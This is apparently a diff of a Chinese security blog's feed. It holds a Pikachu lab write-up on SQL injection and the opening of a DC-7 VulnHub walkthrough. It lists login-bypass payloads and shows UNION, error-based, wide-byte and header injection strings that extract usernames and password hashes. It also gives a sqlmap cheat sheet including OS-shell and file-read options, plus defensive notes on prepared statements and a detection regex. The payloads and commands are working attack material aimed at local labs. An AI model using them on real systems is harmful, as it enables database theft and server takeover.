+1 or '1'='1'=1
+1 or '1'='1' or 4=4
+'OR 4=4%00
+&quot;or 4=4%00
+'xor
+admin' UNION Select 1,1,1 FROM admin Where ''='
+1
+-1%cf' union select 1,1,1 as password,1,1,1 %23
+1
+17..admin' or 'a'='a 密码随便
+'or'='or'
+'or 4=4/*
+something
+' OR '1'='1
+1'or'1'='1
+admin' OR 4=4/*
+1'or'1'='1
+</code></pre>
+<h2 id="sql-注入的预防">Sql 注入的预防</h2>
+<p>一般在项目中我们不太会去注意 SQL 注入的问题，因为我们会使用 ORM，而 ORM 在实现的过程中也会帮我做 SQL 注入过滤；但有的时候 ORM 没法满足我们的需求，这时可能就会手撸原生 SQL 来执行</p>
+<p>注：ORM（对象关系映射）是一种软件设计模式，用于将关系型数据库中的数据映射到面向对象编程语言中的对象模型。<strong>它允许开发人员使用面向对象的方式操作数据库，而不需要直接编写SQL语句。</strong></p>
+<h3 id="预编译preparedstatementjsp">预编译(PreparedStatement)(JSP)</h3>
+<hr>
+<p>可以采用预编译语句集，它内置了处理SQL注入的能力，只要使用它的setXXX方法传值即可。</p>
+<pre><code>String sql = &quot;select id, no from user where id=?&quot;;
+PreparedStatement ps = conn.prepareStatement(sql);
+ps.setInt(1, id);
+ps.executeQuery();
+</code></pre>
+<p>如上所示，就是典型的采用 SQL语句预编译来防止SQL注入 。为什么这样就可以防止SQL注入呢？</p>
+<p>其原因就是：采用了PreparedStatement预编译，就会将SQL语句：&quot;select id, no from user where id=?&quot; 预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该SQL语句的语法结构了，因为语法分析已经完成了，而语法分析主要是分析SQL命令，比如 select、from 、where 、and、 or 、order by 等等。所以即使你后面输入了这些SQL命令，也不会被当成SQL命令来执行了，因为这些SQL命令的执行， 必须先通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为SQL命令来执行的，只会被当做字符串字面值参数。所以SQL语句预编译可以有效防御SQL注入。</p>
+<p>原理：SQL注入只对SQL语句的编译过程有破坏作用，而PreparedStatement已经预编译好了，执行阶段只是把输入串作为数据处理。而不再对SQL语句进行解析。因此也就避免了sql注入问题。</p>
+<h3 id="pdophp">PDO（PHP）</h3>
+<p>首先简单介绍一下什么是PDO。PDO是PHP Data Objects（php数据对象）的缩写。是在php5.1版本之后开始支持PDO。你可以把PDO看做是php提供的一个类。它提供了一组数据库抽象层API，使得编写php代码不再关心具体要连接的数据库类型。你既可以用使用PDO连接mysql，也可以用它连接oracle。并且PDO很好的解决了sql注入问题。</p>
+<p>PDO对于解决SQL注入的原理也是基于预编译。</p>
+<pre><code>$data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
+$data-&gt;bindParam( ':id', $id, PDO::PARAM_INT );
+$data-&gt;execute();
+</code></pre>
+<p>实例化PDO对象之后，首先是对请求SQL语句做预编译处理。在这里，我们使用了占位符的方式，将该SQL传入prepare函数后，预处理函数就会得到本次查询语句的SQL模板类，并将这个模板类返回，模板可以防止传那些危险变量改变本身查询语句的语义。然后使用 bindParam()函数对用户输入的数据和参数id进行绑定，最后再执行.</p>
+<h3 id="使用正则表达式过滤">使用正则表达式过滤</h3>
+<p>正则表达式是一种用于匹配模式的工具，在检测 SQL 注入时非常有用。我们可以使用正则表达式来过滤和验证用户输入，以确保输入不包含任何恶意的 SQL 代码。下面是一些常见的正则表达式示例：</p>
+<p>对用户输入的特殊字符进行严格过滤，如 '、&quot;、&lt;、&gt;、/、*、;、+、-、&amp;、|、(、)、and、or、select、union</p>
+<pre><code>pattern = re.compile(
+    r&quot;(%27)|(\')|(\-\-)|(%23)|(#)|&quot;  # Regex for detection of SQL meta-characters
+    r&quot;\w*((%27)|(\'))\s+((%6F)|o|(%4F))((%72)|r|(%52))\s*|&quot;  # Modified regex for detection of SQL meta-characters eg: ' or 1 = 1' detect word 'or',
+    r&quot;((%3D)|(=))[^\n]*((%27)|(\')|(\-\-)|(%3B)|(;))&quot;  # Regex for typical SQL Injection attack eg: '= 1 --'
+    r&quot;((%27)|(\'))union|&quot;  # Regex for detecting SQL Injection with the UNION keyword
+    r&quot;((%27)|(\'))select|&quot;  # Regex for detecting SQL Injection with the UNION keyword
+    r&quot;((%27)|(\'))insert|&quot;  # Regex for detecting SQL Injection with the UNION keyword
+    r&quot;((%27)|(\'))update|&quot;  # Regex for detecting SQL Injection with the UNION keyword
+    r&quot;((%27)|(\'))drop&quot;,  # Regex for detecting SQL Injection with the UNION keyword
+    re.IGNORECASE,
+)
+r = pattern.search(&quot;' OR 1 -- -&quot;)
+if r:
+    return True
+</code></pre>
+<h3 id="其他">其他</h3>
+<p>Web 应用中用于连接数据库的用户与数据库的系统管理员用户的权限有严格的区分（如不能执行 drop 等），并设置 Web 应用中用于连接数据库的用户不允许操作其他数据库。</p>
+<p>设置 Web 应用中用于连接数据库的用户对 Web 目录不允许有写权限。</p>
+<p>严格限定参数类型和格式，明确参数检验的边界，必须在服务端正式处理之前对提交的数据的合法性进行检查。</p>
+<p>使用 Web 应用防火墙。</p>
+<h3 id="sql-inject-漏洞攻击流程">SQL Inject 漏洞攻击流程</h3>
+<p>1 注入点探测<br>
+自动方式：使用web漏洞扫描工具，自动进行注入点发现<br>
+手动方式：手工构造sql inject测试语句进行注入点发现<br>
+2 信息收集<br>
+通过注入点取期望得到的数据<br>
+（1） 环境信息：数据库类型，数据库版本，操作系统版本，用户信息等<br>
+（2）数据库信息：数据库名称，数据库表，表字段，字段内容，甚至加密的内容也可能会被破解<br>
+3 获取权限<br>
+获取操作系统权限：通过数据库执行shell，上传木马</p>
+<h5 id="常见的注入点类型">常见的注入点类型：</h5>
+<p>数字型</p>
+<pre><code class="language-sql">user_id = $id
+</code></pre>
+<p>字符型</p>
+<pre><code class="language-sql">user_id = '$id'
+</code></pre>
+<p>搜索型</p>
+<pre><code class="language-sql">text LIKE '%{$_GET['search']}%'&quot;
+</code></pre>
+<h3 id="数字型注入post">数字型注入（post）</h3>
+<p>先测试功能点 随便点一个数字 看看会怎么样 这里我选择的数字1</p>
+<figure data-type="image" tabindex="78"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252498.png" alt="image-20240801144856931" loading="lazy"></figure>
+<p>发现url中没有传参，提交方式为post</p>
+<p>来试试抓包的情况下 点击数字1  看看会怎么样</p>
+<figure data-type="image" tabindex="79"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252527.png" alt="image-20240801150253329" loading="lazy"></figure>
+<p>发送到Repeater，构造peyload，然后点击发送。<br>
+payload:  1 or 1 = 1</p>
+<p>1=1永远为true，所以将会遍历出所有用户的邮箱。</p>
+<figure data-type="image" tabindex="80"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252556.png" alt="image-20240801150513879" loading="lazy"></figure>
+<figure data-type="image" tabindex="81"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252581.png" alt="image-20240801150536270" loading="lazy"></figure>
+<p>尝试在抓包过程中输入 and 1=2</p>
+<figure data-type="image" tabindex="82"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141326598.png" alt="image-20240814132649539" loading="lazy"></figure>
+<p>发现页面报错</p>
+<figure data-type="image" tabindex="83"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141328130.png" alt="image-20240814132805087" loading="lazy"></figure>
+<p>我们以此判断是数字型注入（题目也说明了），不需要闭合符</p>
+<p>接下来我们使用order by来判断可以显示的列</p>
+<p>当查询字段数为2时，页面正常显示</p>
+<figure data-type="image" tabindex="84"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141330781.png" alt="image-20240814133030721" loading="lazy"></figure>
+<p>当查询字段数为3时，页面报错，所以显示有两列</p>
+<figure data-type="image" tabindex="85"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141331914.png" alt="image-20240814133134857" loading="lazy"></figure>
+<p>其原理是，order by会对列继续排序，当我们输入的列数超过实际拥有的列数，就会提示该列不存在</p>
+<p>接下来判断每列显示的位置</p>
+<figure data-type="image" tabindex="86"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141334788.png" alt="image-20240814133415727" loading="lazy"></figure>
+<p>查询数据库和数据库版本</p>
+<p>payload</p>
+<pre><code>id=-2 union select database(),version()
+</code></pre>
+<figure data-type="image" tabindex="87"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141345847.png" alt="image-20240814134528781" loading="lazy"></figure>
+<p>查询所有表，这里使用mysql5.0以上版本自带的information_schema表</p>
+<p>payload</p>
+<p>id=-2 union select group_concat(table_name),2 from information_schema.tables where table_schema='pikachu'</p>
+<figure data-type="image" tabindex="88"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141351952.png" alt="image-20240814135143884" loading="lazy"></figure>
+<p>查询敏感表users表中所有列</p>
+<p>id=-2 union select group_concat(column_name),2 from information_schema.columns where table_schema='pikachu' and table_name='users'</p>
+<figure data-type="image" tabindex="89"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141353061.png" alt="image-20240814135324001" loading="lazy"></figure>
+<p>查询用户名和密码</p>
+<p>id=-2 union select group_concat(username),group_concat(password) from users</p>
+<figure data-type="image" tabindex="90"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141404717.png" alt="image-20240814140441672" loading="lazy"></figure>
+<p>将得到的密文拿到md5在线解密进行解密</p>
+<figure data-type="image" tabindex="91"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141405800.png" alt="image-20240814140553755" loading="lazy"></figure>
+<p>字符型注入(get)</p>
+<p>首先 我们在输入框的地方输入数字1 查看页面有什么变化</p>
+<figure data-type="image" tabindex="92"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252638.png" alt="image-20240801181404376" loading="lazy"></figure>
+<p>发现在输入框输入的数据被传递到url中去了  提交方式为get</p>
+<p>输入1‘ 看看回显</p>
+<figure data-type="image" tabindex="93"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408151042977.png" alt="image-20240815104246884" loading="lazy"></figure>
+<p>发现报错</p>
+<p>可以猜测闭合符就是单引号</p>
+<p>猜测出闭合符，我们可以尝试构造万能密码查询所有数据</p>
+<p>payload</p>
+<pre><code>' or '1'='1
+</code></pre>
+<figure data-type="image" tabindex="94"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408151044631.png" alt="image-20240815104415576" loading="lazy"></figure>
+<p>我们也可以查询所有的表，数据库</p>
+<p>查所有表</p>
+<p>payload</p>
+<p>1' union select group_concat(table_name),2 from information_schema.tables where table_schema=database() --+&amp;submit=查询</p>
+<figure data-type="image" tabindex="95"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408151045425.png" alt="image-20240815104542373" loading="lazy"></figure>
+<p>字符型注入，我们可以猜测sql语句的大概格式<br>
+select 字段1，字段2 from 表名 where username = 'admin';<br>
+构造闭合，输入admin’ or 1=1#<br>
+select 字段1，字段2 from 表名 where username = 'admin' or 1=1#';</p>
+<p>在sql语句中，#为注释符</p>
+<figure data-type="image" tabindex="96"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252903.png" alt="image-20240801181940625" loading="lazy"></figure>
+<figure data-type="image" tabindex="97"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408141252936.png" alt="image-20240801181905368" loading="lazy"></figure>
+<h3 id="搜索型注入">搜索型注入</h3>
+<p>我们先随便搜索一个数字1</p>
+<figure data-type="image" tabindex="98"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408151048035.png" alt="image-20240815104813982" loading="lazy"></figure>
+<p>那对于这个题 我们来使用工具sqlmap</p>
+<p>这里介绍下sqlmap常用的一些语法</p>
+<p>get型常用参数</p>
+<p>-u：指定注入的URL   sqlmap -u URL<br>
+--dbs：爆出所有数据库 sqlmap -u URL --dbs<br>
+--dbms：指定数据库类型 sqlmap -u URL --dbms=mysql<br>
+--users：查看数据库的所有用户 sqlmap -u URL --users<br>
+--current-user：查看数据库当前用户 sqlmap -u URL --current-user<br>
+--current-db：查看网站当前数据库 sqlmap -u URL --current-db<br>
+--is-dba：判断当前用户是否有管理员权限 sqlmap -u URL --is-dba<br>
+[11:57:52] [INFO] testing if current user is DBA<br>
+[11:57:52] [INFO] fetching current user<br>
+current user is DBA: True<br>
+--roles：列出数据库所有管理员角色，仅适用于oracle数据库 sqlmap -u URL --roles<br>
+--tables：爆出所有数据表 sqlmap -u URL -D 数据库名 --tables<br>
+--columns：爆出数据库表所有列 sqlmap -u URL -D 数据库名 -T 表名 --columns<br>
+--dump：爆出数据库中列中的所有数据 sqlmap -u URL -D 数据库名 -T 表名 -C 列名 --dump<br>
+--dump-all：爆出数据库中所有的数据 sqlmap -u URL -D 数据库名 -T 表名 --dump-all<br>
+--sql-shell：获取数据库shell  sqlmap -u URL --sql-shell<br>
+--os-shell：获取服务器shell  sqlmap -u URL --os-shell<br>
+--file-read：读取服务器文件  sqlmap -u URL --file-read &quot;文件路径及名称&quot;<br>
+--file-write 本地文件 --file-dist 目标文件路径及名称：将本地文件上传至目标服务器<br>
+--time-sec=2：延时注入 sqlmap -u URL --time-sec=2<br>
+--batch：探测过程中不进行询问，一律选择默认<br>
+-m：如果有多个url地址，可以把多个url保存成一个文本文件，-m可以加载文本文件逐个扫描</p>
+<p>post型常用参数</p>
+<p>-r：指定POST数据文件  sqlmap -r post.txt<br>
+--data：这种不需要将数据进行保存，只需要将post数据复制下来即可 sqlmap -u URL --data=&quot;post数据&quot;<br>
+--forms：自动搜索表单的方式 sqlmap -u URL --forms<br>
+--cookie=&quot;抓取的cookie&quot;：测试cookie字段<br>
+--param-del：参数拆分字符，当GET型或POST型需要用其他字符分割测试参数的时候需要用到此参数，sqlmap -r post.txt --data=&quot;query=foorbar;id=1&quot; --param-del<br>
+--referer：在请求中伪造http中的referer，当level参数设定为3或者3以上的时候会尝试对referer注入<br>
+--headers：增加额外的http头<br>
+--proxy：指定代理地址<br>
+-p：指定测试参数</p>
+<p>回到题目 首先我们来查看是否存在注入点</p>
+<p>由于我安装多个python 所以要在使用的时候在语句中写清楚到底是用的哪一个python 我这里是使用的python312版本</p>
+<p>故语句为python312 sqlmap.py -u http://127.0.0.1/pikachu-master/vul/sqli/sqli_search.php?name=1&amp;submit=%E6%90%9C%E7%B4%A2#</p>
+<figure data-type="image" tabindex="99"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408151156650.png" alt="image-20240815115627559" loading="lazy"></figure>
+<figure data-type="image" tabindex="100"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408151157901.png" alt="image-20240815115717836" loading="lazy"></figure>
+<p>成功探测出注入点，并且爆出了数据库类型及其版本</p>
+<p>接着爆库</p>
+<p>payload</p>
+<p>python312 sqlmap.py -u &quot;127.0.0.1/pikachu-master/vul/sqli/sqli_search.php?name=1&amp;submit=搜索#&quot; --dbs</p>
+<figure data-type="image" tabindex="101"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408151201559.png" alt="image-20240815120140486" loading="lazy"></figure>
+<p>爆表</p>
+<p>payload</p>
+<p>python312 sqlmap.py -u &quot;127.0.0.1/pikachu-master/vul/sqli/sqli_search.php?name=1&amp;submit=搜索#&quot; -D &quot;pikachu&quot; <em>--tables</em></p>
+<figure data-type="image" tabindex="102"><img src="C:/Users/613/AppData/Roaming/Typora/typora-user-images/image-20240815120834889.png" alt="image-20240815120834889" loading="lazy"></figure>
+<p>爆字段名</p>
+<p>payload</p>
+<p>python312 sqlmap.py -u &quot;127.0.0.1/pikachu-master/vul/sqli/sqli_search.php?name=1&amp;submit=搜索#&quot; -D &quot;pikachu&quot; -T &quot;users&quot; --columns</p>
+<figure data-type="image" tabindex="103"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408151207400.png" alt="image-20240815120744334" loading="lazy"></figure>
+<p>爆数据</p>
+<p>python312 sqlmap.py -u &quot;127.0.0.1/pikachu-master/vul/sqli/sqli_search.php?name=1&amp;submit=搜索#&quot; -D &quot;pikachu&quot; -T &quot;users&quot; -C &quot;password,username&quot; --dump</p>
+<figure data-type="image" tabindex="104"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408151214811.png" alt="image-20240815121404745" loading="lazy"></figure>
+<h3 id="xx型注入">xx型注入</h3>
+<p>和上题一样 sqlmap跑 嘿嘿</p>
+<figure data-type="image" tabindex="105"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191528598.png" alt="image-20240819152807534" loading="lazy"></figure>
+<figure data-type="image" tabindex="106"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191508211.png" alt="image-20240819150842070" loading="lazy"></figure>
+<h3 id="insertupdate注入">insert/update注入</h3>
+<p>这其实就是报错注入，我们先根据提示进行注册</p>
+<p>在注册时，我们进行抓包</p>
+<figure data-type="image" tabindex="107"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191516498.png" alt="image-20240819151629425" loading="lazy"></figure>
+<p>我们将post请求的内容复制下来</p>
+<p>依旧使用我们的sqlmap进行测试</p>
+<figure data-type="image" tabindex="108"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191529786.png" alt="image-20240819152936732" loading="lazy"></figure>
+<figure data-type="image" tabindex="109"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191529953.png" alt="image-20240819152917884" loading="lazy"></figure>
+<p>sqlmap是可以的，那我们再来试一下手注</p>
+<p>我们将刚刚抓到的数据包发送到重发器</p>
+<figure data-type="image" tabindex="110"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191533336.png" alt="image-20240819153341267" loading="lazy"></figure>
+<p>这里我们使用updatexml函数进行注入</p>
+<p>查询当前数据库</p>
+<p>username=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and'</p>
+<figure data-type="image" tabindex="111"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191534986.png" alt="image-20240819153455918" loading="lazy"></figure>
+<p>查询所有表</p>
+<p>username=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and'</p>
+<figure data-type="image" tabindex="112"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191545766.png" alt="image-20240819154549696" loading="lazy"></figure>
+<p>查询所有字段名</p>
+<p>username=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1) and'</p>
+<figure data-type="image" tabindex="113"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191547017.png" alt="image-20240819154719948" loading="lazy"></figure>
+<p>查询数据</p>
+<p>因为查询出的密码不能完全显示，所以我们这里再使用一个substr函数，进行字符串的截取</p>
+<p>username=1'and updatexml(1,concat(0x7e,substr((select group_concat(id,':',username,':',password) from users),1,31),0x7e),1) and'</p>
+<figure data-type="image" tabindex="114"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191548168.png" alt="image-20240819154800100" loading="lazy"></figure>
+<p>获取到密文</p>
+<p>e10adc3949ba59abbe56e05</p>
+<p>将密文拿去md5解密 得到</p>
+<figure data-type="image" tabindex="115"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191551192.png" alt="image-20240819155107134" loading="lazy"></figure>
+<h3 id="delete注入">delete注入</h3>
+<p>根据题目提示不难猜出，跟删除有关系，那么我们首先进行留言</p>
+<figure data-type="image" tabindex="116"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191552714.png" alt="image-20240819155246669" loading="lazy"></figure>
+<p>在删除时我们利用bp抓包，我们可以发现这里有个id参数</p>
+<figure data-type="image" tabindex="117"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191553097.png" alt="image-20240819155336049" loading="lazy"></figure>
+<p>我们对这个参数进行报错注入测试</p>
+<p>这里我一直不成功，最后发现是我的空格被编译了，这里我们为了绕过编译，把空格替换为+</p>
+<p>?id=61+and+updatexml(1,concat(0x7e,(select+database()),0x7e),1)</p>
+<figure data-type="image" tabindex="118"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191556871.png" alt="image-20240819155616815" loading="lazy"></figure>
+<p>得到了</p>
+<figure data-type="image" tabindex="119"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191556188.png" alt="image-20240819155634148" loading="lazy"></figure>
+<p>后面步骤与报错注入一样</p>
+<h3 id="http头部注入">http头部注入</h3>
+<p>根据提示登录</p>
+<figure data-type="image" tabindex="120"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191558026.png" alt="image-20240819155801972" loading="lazy"></figure>
+<p>发现会回显我们的UA头和accept信息</p>
+<p>我们退出登录，重新登录并且抓包</p>
+<figure data-type="image" tabindex="121"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191559204.png" alt="image-20240819155909138" loading="lazy"></figure>
+<p>这个包并不是我们想要的，放掉他，抓下一个</p>
+<figure data-type="image" tabindex="122"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191600979.png" alt="image-20240819160025925" loading="lazy"></figure>
+<p>这里我们尝试对UA头进行报错注入</p>
+<p>User-Agent: 1' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or '</p>
+<figure data-type="image" tabindex="123"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191604545.png" alt="image-20240819160413488" loading="lazy"></figure>
+<figure data-type="image" tabindex="124"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191604052.png" alt="image-20240819160427011" loading="lazy"></figure>
+<p>后续步骤与报错注入相同</p>
+<h3 id="布尔盲注">布尔盲注</h3>
+<p>盲注很麻烦，这里建议直接使用sqlmap跑</p>
+<p>我们先随便搜索一个内容</p>
+<figure data-type="image" tabindex="125"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191608725.png" alt="image-20240819160854669" loading="lazy"></figure>
+<p>复制url到sqlmap中测试</p>
+<figure data-type="image" tabindex="126"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191611195.png" alt="image-20240819161109139" loading="lazy"></figure>
+<p>sqlmap就是好用 嘿嘿</p>
+<figure data-type="image" tabindex="127"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191620554.png" alt="image-20240819162048493" loading="lazy"></figure>
+<p>爆库</p>
+<figure data-type="image" tabindex="128"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191623986.png" alt="image-20240819162316938" loading="lazy"></figure>
+<h3 id="时间盲注">时间盲注</h3>
+<p>与布尔盲注一样，都是用sqlmap跑</p>
+<h3 id="宽字节注入">宽字节注入</h3>
+<p>我们先简单了解下原理</p>
+<p>宽字节注入利用Unicode编码中的特性，将特殊字符转换为双字节字符，绕过输入过滤和检查，从而执行恶意的SQL查询</p>
+<p>回到题目，随便查询个东西并用bp抓包</p>
+<figure data-type="image" tabindex="129"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191629227.png" alt="image-20240819162949180" loading="lazy"></figure>
+<figure data-type="image" tabindex="130"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191634400.png" alt="image-20240819163410350" loading="lazy"></figure>
+<p>我们接下来构造payload</p>
+<p>name=1%df' union select version(),database() --+</p>
+<figure data-type="image" tabindex="131"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191635431.png" alt="image-20240819163546384" loading="lazy"></figure>
+<figure data-type="image" tabindex="132"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191635286.png" alt="image-20240819163500247" loading="lazy"></figure>
+<p>查表</p>
+<p>name=1%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+</p>
+<figure data-type="image" tabindex="133"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191637985.png" alt="image-20240819163716927" loading="lazy"></figure>
+<p>查字段名</p>
+<p>查询内部语句有引号  使用16进制编码绕过</p>
+<p>name=1%df' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273--+</p>
+<figure data-type="image" tabindex="134"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191638237.png" alt="image-20240819163818180" loading="lazy"></figure>
+<p>爆数据</p>
+<p>name=1%df' union select group_concat(username),group_concat(password) from pikachu.users --+</p>
+<figure data-type="image" tabindex="135"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408191706731.png" alt="image-20240819170612668" loading="lazy"></figure>
+<h2 id="rce">RCE</h2>
+<p>RCE(remote command/code execute)概述</p>
+<p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
+<p>远程系统命令执行<br>
+一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口<br>
+比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>
+一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器</p>
+<p>现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过&quot;自动化运维平台&quot;进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的&quot;收获&quot;-_-</p>
+<p>远程代码执行<br>
+同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。</p>
+<p>因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>
+<p>你可以通过“RCE”对应的测试栏目，来进一步的了解该漏洞。</p>
+<h3 id="1exec-ping">1.exec &quot;ping&quot;</h3>
+<p>我们先来了解下Windows系统和Linux系统的连接符</p>
+<p>Windows系统：<br>
+|：只执行后面的语句。<br>
+||：如果前面的语句执行失败，则执行后面的语句。<br>
+&amp;：两条语句都执行，如果前面的语句为假则执行后面的语句，如果前面的语句为真则不执行后面的语句。<br>
+&amp;&amp;：如果前面的语句为假，则直接出错，也不再执行后面的语句；前面的语句为真则两条命令都执行，前面的语句只能为真。</p>
+<p>Linux系统：<br>
+;：执行完前面的语句再执行后面的语句，当有一条命令执行失败时，不会影响其它语句的执行。<br>
+|（管道符）：只执行后面的语句。<br>
+||（逻辑或）：只有前面的语句执行出错时，执行后面的语句。<br>
+&amp;（后台任务符）：两条语句都执行，如果前面的语句为假则执行后面的语句，如果前面的语句为真则不执行后面的语句。<br>
+&amp;&amp;（逻辑与）：如果前面的语句为假则直接出错，也不再执行后面的语句；前面的语句为真则两条命令都执行，前面的语句只能为真。（命令替换）：当一个命令被解析时，它首先会执行反引号之间的操作。例 echo whoami</p>
+<h1 id="未完待续">未完待续...</h1>
+<h3 id=""></h3>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[DC-7靶场]]></title>
+        <id>https://dengdinshan.github.io/post/dc-7-ba-chang/</id>
+        <link href="https://dengdinshan.github.io/post/dc-7-ba-chang/">
+        </link>
+        <updated>2024-10-16T15:23:54.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="dc-7">DC-7</h1>
+<p>靶场下载地址  https://www.vulnhub.com/entry/dc-7,356/</p>
+<p>导入virtualbox</p>
+<p>kali ip 192.168.56.102</p>
+<p>靶机ip 192.168.56.112</p>
+<p>还问我ip地址怎么知道的？？</p>
+<p>扫啊</p>
+<figure data-type="image" tabindex="1"><img src="C:/Users/613/AppData/Roaming/Typora/typora-user-images/image-20241013204044618.png" alt="image-20241013204044618" loading="lazy"></figure>
+<p>ip都找到了 不看看有哪些服务吗？</p>
+<figure data-type="image" tabindex="2"><img src="C:/Users/613/AppData/Roaming/Typora/typora-user-images/image-20241013204112535.png" alt="image-20241013204112535" loading="lazy"></figure>
+<p>扫到两个端口22, 80  说明有网页端和ssh端口</p>
+<p>使用dirseach扫描目录</p>
+<figure data-type="image" tabindex="3"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151726863.png" alt="image-20241015172613754" loading="lazy"></figure>
+<p>通过扫描结果进入扫出的页面</p>
+<figure data-type="image" tabindex="4"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151801088.png" alt="image-20241015180124025" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="C:/Users/613/AppData/Roaming/Typora/typora-user-images/image-20241015180139256.png" alt="image-20241015180139256" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410151801886.png" alt="image-20241015180149653" loading="lazy"></figure>
